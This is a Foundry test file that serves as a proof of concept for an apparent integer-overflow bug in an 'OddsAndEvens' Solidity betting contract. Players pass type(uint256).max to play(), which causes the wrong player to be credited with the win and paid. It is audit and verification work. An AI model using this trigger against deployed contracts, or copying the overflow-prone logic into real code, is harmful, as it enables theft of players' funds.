// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/odds_and_evens.sol";

contract OddsAndEvensOverflowTest is Test {
    OddsAndEvens public game;
    address public alice = address(0x100); // Non-precompile address
    address public bob = address(0x200);   // Non-precompile address

    function setUp() public {
        game = new OddsAndEvens();
        vm.deal(alice, 100 ether);
        vm.deal(bob, 100 ether);
    }

    function testAdditionOverflow() public {
        // == Record initial state BEFORE attack ==
        console2.log("--- BEFORE-Trigger Play ---");
        (uint256 aliceWinsBefore, uint256 aliceGamesBefore) = game.getPlayerStats(alice);
        (uint256 bobWinsBefore, uint256 bobGamesBefore) = game.getPlayerStats(bob);
        uint256 totalWinnersBefore = game.totalWinners();
        uint256 totalGamesBefore = game.totalGames();
        
        console2.log("Alice state: wins=%d, games=%d", aliceWinsBefore, aliceGamesBefore);
        console2.log("Bob state: wins=%d, games=%d", bobWinsBefore, bobGamesBefore);
        console2.log("Global state: winners=%d, games=%d", totalWinnersBefore, totalGamesBefore);

        // == Execute vulnerability trigger ==
        console2.log("--- Trigger Overflow ---");
        vm.prank(alice);
        game.play{value: 1 ether}(type(uint256).max);
        vm.prank(bob);
        game.play{value: 1 ether}(type(uint256).max);

        // == Record final state AFTER attack ==
        console2.log("--- AFTER-Trigger Play ---");
        (uint256 aliceWinsAfter, uint256 aliceGamesAfter) = game.getPlayerStats(alice);
        (uint256 bobWinsAfter, uint256 bobGamesAfter) = game.getPlayerStats(bob);
        uint256 totalWinnersAfter = game.totalWinners();
        uint256 totalGamesAfter = game.totalGames();
        
        console2.log("Alice state: wins=%d, games=%d", aliceWinsAfter, aliceGamesAfter);
        console2.log("Bob state: wins=%d, games=%d", bobWinsAfter, bobGamesAfter);
        console2.log("Global state: winners=%d, games=%d", totalWinnersAfter, totalGamesAfter);

        // == Verify state changes ==
        console2.log("--- Vulnerability Differential Check ---");
        console2.log("Alice wins: %d -> %d (change: %s)", 
            aliceWinsBefore, aliceWinsAfter, 
            aliceWinsAfter > aliceWinsBefore ? "INCREASE" : "no change");
        console2.log("Bob wins: %d -> %d (change: %s)", 
            bobWinsBefore, bobWinsAfter, 
            bobWinsAfter > bobWinsBefore ? "INCREASE" : "no change");
        console2.log("Total winners: %d -> %d (delta: %d)", 
            totalWinnersBefore, totalWinnersAfter, 
            totalWinnersAfter - totalWinnersBefore);
        console2.log("Total games: %d -> %d (delta: %d)", 
            totalGamesBefore, totalGamesAfter, 
            totalGamesAfter - totalGamesBefore);

        // == Final verdict based on state changes ==
        bool inconsistencyDetected = 
            aliceWinsAfter == 1 &&   // Alice improperly credited with win
            bobWinsAfter == 0 &&     // Bob should win but didn't
            totalWinnersAfter == 1 && // Only 1 winner recorded
            totalGamesAfter == 1;    // Only 1 game registered

        if (inconsistencyDetected) {
            console2.log("Vulnerability Exists: Integer overflow caused incorrect winner assignment (Alice won, but Bob should have won with even sum)");
        } else {
            console2.log("Vulnerability not Exist: Game state changed as expected with no anomaly detected");
        }

        // Original PoC assertions (remain unchanged)
        (uint256 aliceWins, ) = game.getPlayerStats(alice);
        assertEq(aliceWins, 1, "Alice should have 1 win after overflow");
        uint256 aliceInitialBalance = 100 ether; // Fixed initialization value
        assertEq(alice.balance, aliceInitialBalance + 0.8 ether, "Alice net gain incorrect");
        assertEq(bob.balance, 100 ether - 1 ether, "Bob net loss incorrect");
    }
}